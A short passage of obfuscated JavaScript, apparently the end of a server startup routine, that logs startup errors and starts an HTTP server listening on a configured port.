_0x32c2e7=_0x5c6225;console[_0x32c2e7(0xaf)]('Unhandled\x20error\x20in\x20startserver:',_0x49ffbe);}),app[_0x5c6225(0x109)](PORT,()=>console[_0x5c6225(0x120)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
